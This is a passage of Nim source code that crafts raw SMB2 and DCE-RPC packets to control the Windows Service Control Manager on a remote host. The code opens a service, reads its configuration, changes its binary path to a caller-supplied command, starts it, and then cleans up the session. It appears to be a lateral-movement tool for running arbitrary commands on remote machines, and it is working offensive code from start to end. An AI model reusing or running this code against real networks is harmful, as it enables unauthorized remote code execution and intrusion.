    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)],addr rpcHeader, sizeof(RPCHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)+sizeof(RPCHeader)],addr openServiceWData[0], openServiceWData.len)
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[returnSize-4]))[] == 0):
        messageID[] = messageID[]+1
        callID[] = callID[]+1
        var isZero:bool = true
        var tempArr:seq[byte] = GetByteRange(addr returnValue[0],140,159)
        # Check all zero
        for i in countup(0,19):
            if(tempArr[i] != 0x00):
                isZero = false
                break
        if(isZero):
            return false
        copyMem(scServiceHandle,addr tempArr[0],20)
        return true
    else:
        return false   



proc QueryServiceConfigWRPC*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scServiceHandle: ptr array[20,byte], serviceStruct: ptr ServiceInfo):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x0b,1,1,messageID[],treeID[],sessionID[])
    var queryServiceConfigWData:QueryServiceConfigWData = QueryServiceConfigWFiller(scServiceHandle,[byte 0x00, 0x00, 0x00, 0x00])
    var rpcHeader:RPCHeader = RPCHeaderFiller(sizeof(QueryServiceConfigWData),callID,[byte 0x11, 0x00])
    var smb2IoctlHeader:SMB2IoctlHeader = SMB2IoctlRequest(fileID,sizeof(QueryServiceConfigWData)+sizeof(RPCHeader))
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + sizeof(QueryServiceConfigWData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader))
    var dataLength:int = sizeof(SMB2Header) + sizeof(QueryServiceConfigWData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2IoctlHeader, sizeof(SMB2IoctlHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)],addr rpcHeader, sizeof(RPCHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)+sizeof(RPCHeader)],addr queryServiceConfigWData, sizeof(QueryServiceConfigWData))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    
    if((cast[ptr uint32](addr returnValue[returnSize - 4]))[] == 122 and (cast[ptr uint32](addr returnValue[176]))[] != 0): # 122 --> ERROR_INSUFFICIENT_BUFFER
        messageID[] = messageID[]+1
        callID[] = callID[]+1
        var bufferSize:seq[byte] = GetByteRange(addr returnValue[0],176,179)
        smb2Header = SMB2HeaderFiller(0x0b,1,1,messageID[],treeID[],sessionID[])
        queryServiceConfigWData = QueryServiceConfigWFiller(scServiceHandle,[byte bufferSize[0], bufferSize[1], bufferSize[2], bufferSize[3]])
        rpcHeader = RPCHeaderFiller(sizeof(QueryServiceConfigWData),callID,[byte 0x11, 0x00])
        smb2IoctlHeader = SMB2IoctlRequest(fileID,sizeof(QueryServiceConfigWData)+sizeof(RPCHeader))
        netbiosHeader = NetBiosFiller( sizeof(SMB2Header) + sizeof(QueryServiceConfigWData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader))
        dataLength = sizeof(SMB2Header) + sizeof(QueryServiceConfigWData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader) + sizeof(NetBiosHeader)
        sendData = newSeq[byte](dataLength)
        copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
        copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
        copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2IoctlHeader, sizeof(SMB2IoctlHeader))
        copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)],addr rpcHeader, sizeof(RPCHeader))
        copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)+sizeof(RPCHeader)],addr queryServiceConfigWData, sizeof(QueryServiceConfigWData))
        (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
        if((cast[ptr uint32](addr returnValue[returnSize - 4]))[] == 0):
            messageID[] = messageID[]+1
            callID[] = callID[]+1
            var rpcData:seq[byte] = GetByteRange(addr returnValue[0],140,cast[int](returnSize-1))
            # var serviceType:uint32 = (cast[ptr uint32](addr rpcData[0]))[]
            serviceStruct[].StartType = (cast[ptr uint32](addr rpcData[4]))[]
            # var errorControl:uint32 = (cast[ptr uint32](addr rpcData[8]))[]
            # var dwTagId:uint32  =  (cast[ptr uint32](addr rpcData[20]))[]
            var tempOffset:int = 0;
            var realOffset:int = 36;
            serviceStruct[].BinaryPath = UnmarshallStringForRPC(addr rpcData[realOffset],addr tempOffset)
            realOffset+=tempOffset
            serviceStruct[].LoadOrderGroup = UnmarshallStringForRPC(addr rpcData[realOffset],addr tempOffset)
            realOffset+=tempOffset
            serviceStruct[].Dependencies = UnmarshallStringForRPC(addr rpcData[realOffset],addr tempOffset)
            realOffset+=tempOffset
            serviceStruct[].ServiceStartName = UnmarshallStringForRPC(addr rpcData[realOffset],addr tempOffset)
            return true
        else:
            return false
    else:
        return false   
    
proc ChangeServiceConfigWRPC*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scServiceHandle: ptr array[20,byte], command: string):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x0b,1,1,messageID[],treeID[],sessionID[])
    var changeServiceConfigWData:seq[byte] = ChangeServiceConfigWFiller(scServiceHandle, 0x00000003,command)
    var rpcHeader:RPCHeader = RPCHeaderFiller(changeServiceConfigWData.len,callID,[byte 0x0b, 0x00])
    var smb2IoctlHeader:SMB2IoctlHeader = SMB2IoctlRequest(fileID,changeServiceConfigWData.len+sizeof(RPCHeader))
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + changeServiceConfigWData.len + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader))
    var dataLength:int = sizeof(SMB2Header) + changeServiceConfigWData.len + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2IoctlHeader, sizeof(SMB2IoctlHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)],addr rpcHeader, sizeof(RPCHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)+sizeof(RPCHeader)],addr changeServiceConfigWData[0], changeServiceConfigWData.len)
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[returnSize-4]))[] == 0):
        messageID[] = messageID[]+1
        callID[] = callID[]+1
        return true
    else:
        return false


proc StartServiceWRPC*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scServiceHandle: ptr array[20,byte]):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x0b,1,1,messageID[],treeID[],sessionID[])
    var startServiceWData:StartServiceWData = StartServiceWFiller(scServiceHandle)
    var rpcHeader:RPCHeader = RPCHeaderFiller(sizeof(StartServiceWData),callID,[byte 0x13, 0x00])
    var smb2IoctlHeader:SMB2IoctlHeader = SMB2IoctlRequest(fileID,sizeof(StartServiceWData)+sizeof(RPCHeader))
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + sizeof(StartServiceWData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader))
    var dataLength:int = sizeof(SMB2Header) + sizeof(StartServiceWData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2IoctlHeader, sizeof(SMB2IoctlHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)],addr rpcHeader, sizeof(RPCHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)+sizeof(RPCHeader)],addr startServiceWData, sizeof(StartServiceWData))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    while(returnValue[12] == 0x03 and returnValue[13] == 0x01 and returnValue[14] == 0x00 and returnValue[15] == 0x00):
        sleep(10000);
        (returnValue,returnSize) = SendAndReceiveFromSocket(socket,nil, false)
    var startServiceReturnValue:uint32 = cast[ptr uint32](addr returnValue[returnSize-4])[]
    case(startServiceReturnValue):
        of ERROR_SUCCESS:
            echo "[+] StartServiceW returned successfully!"
        of ERROR_FILE_NOT_FOUND:
            echo "[!] StartServiceW Return Value: ",ERROR_FILE_NOT_FOUND," (ERROR_FILE_NOT_FOUND)"
        of ERROR_PATH_NOT_FOUND:
            echo "[!] StartServiceW Return Value: ",ERROR_PATH_NOT_FOUND," (ERROR_PATH_NOT_FOUND)"
        of ERROR_ACCESS_DENIED:
            echo "[!] StartServiceW Return Value: ",ERROR_ACCESS_DENIED," (ERROR_ACCESS_DENIED)"
        of ERROR_INVALID_HANDLE:
            echo "[!] StartServiceW Return Value: ",ERROR_INVALID_HANDLE," (ERROR_INVALID_HANDLE)"
        of ERROR_INVALID_PARAMETER:
            echo "[!] StartServiceW Return Value: ",ERROR_INVALID_PARAMETER," (ERROR_INVALID_PARAMETER)"
        of ERROR_SERVICE_REQUEST_TIMEOUT:
            echo "[!] StartServiceW Return Value: ",ERROR_SERVICE_REQUEST_TIMEOUT," (ERROR_SERVICE_REQUEST_TIMEOUT)"
        of ERROR_SERVICE_NO_THREAD:
            echo "[!] StartServiceW Return Value: ",ERROR_SERVICE_NO_THREAD," (ERROR_SERVICE_NO_THREAD)"
        of ERROR_SERVICE_DATABASE_LOCKED:
            echo "[!] StartServiceW Return Value: ",ERROR_SERVICE_DATABASE_LOCKED," (ERROR_SERVICE_DATABASE_LOCKED)"
        of ERROR_SERVICE_ALREADY_RUNNING:
            echo "[!] StartServiceW Return Value: ",ERROR_SERVICE_ALREADY_RUNNING," (ERROR_SERVICE_ALREADY_RUNNING)"
        of ERROR_SERVICE_DISABLED:
            echo "[!] StartServiceW Return Value: ",ERROR_SERVICE_DISABLED," (ERROR_SERVICE_DISABLED)"
        of ERROR_SERVICE_DEPENDENCY_FAIL:
            echo "[!] StartServiceW Return Value: ",ERROR_SERVICE_DEPENDENCY_FAIL," (ERROR_SERVICE_DEPENDENCY_FAIL)"
        of ERROR_SERVICE_LOGON_FAILED:
            echo "[!] StartServiceW Return Value: ",ERROR_SERVICE_LOGON_FAILED," (ERROR_SERVICE_LOGON_FAILED)"
        of ERROR_SERVICE_MARKED_FOR_DELETE:
            echo "[!] StartServiceW Return Value: ",ERROR_SERVICE_MARKED_FOR_DELETE," (ERROR_SERVICE_MARKED_FOR_DELETE)"
        of ERROR_SERVICE_DEPENDENCY_DELETED:
            echo "[!] StartServiceW Return Value: ",ERROR_SERVICE_DEPENDENCY_DELETED," (ERROR_SERVICE_DEPENDENCY_DELETED)"
        of ERROR_SHUTDOWN_IN_PROGRESS:
            echo "[!] StartServiceW Return Value: ",ERROR_SHUTDOWN_IN_PROGRESS," (ERROR_SHUTDOWN_IN_PROGRESS)"
        else:
            echo "[!] StartServiceW Unknown Error: ", startServiceReturnValue
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        callID[] = callID[]+1
        return true
    else:
        return false

proc CloseServiceHandleRPC*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scHandle: ptr array[20,byte]):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x0b,1,1,messageID[],treeID[],sessionID[])
    var closeServiceHandleData:CloseServiceHandleData = CloseServiceHandleFiller(scHandle)
    var rpcHeader:RPCHeader = RPCHeaderFiller(sizeof(CloseServiceHandleData),callID,[byte 0x00, 0x00])
    var smb2IoctlHeader:SMB2IoctlHeader = SMB2IoctlRequest(fileID,sizeof(CloseServiceHandleData)+sizeof(RPCHeader))
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + sizeof(CloseServiceHandleData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader))
    var dataLength:int = sizeof(SMB2Header) + sizeof(CloseServiceHandleData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2IoctlHeader, sizeof(SMB2IoctlHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)],addr rpcHeader, sizeof(RPCHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)+sizeof(RPCHeader)],addr closeServiceHandleData, sizeof(CloseServiceHandleData))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[returnSize-4]))[] == 0):
        messageID[] = messageID[]+1
        callID[] = callID[]+1
        return true
    else:
        return false


proc SMB2Close*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte]):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x06,1,1,messageID[],treeID[],sessionID[])
    var smb2CloseData:SMB2CloseData = SMB2CloseFiller(fileID)
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + sizeof(SMB2CloseData))
    var dataLength:int = sizeof(SMB2Header) + sizeof(SMB2CloseData) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2CloseData, sizeof(SMB2CloseData))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        return true
    else:
        return false


proc TreeDisconnectRequest*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte]):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x04,1,1,messageID[],treeID[],sessionID[])
    var treeDisconnectData:TreeDisconnectData = TreeDisconnectFiller()
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + sizeof(TreeDisconnectData))
    var dataLength:int = sizeof(SMB2Header) + sizeof(TreeDisconnectData) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr treeDisconnectData, sizeof(TreeDisconnectData))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        return true
    else:
        return false

proc SessionLogoffRequest*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte]):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x02,1,1,messageID[],treeID[],sessionID[])
    var sessionLogoffData:SessionLogoffData = SessionLogoffRequestFiller()
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + sizeof(SessionLogoffData))
    var dataLength:int = sizeof(SMB2Header) + sizeof(SessionLogoffData) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr sessionLogoffData, sizeof(SessionLogoffData))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        return true
    else:
        return false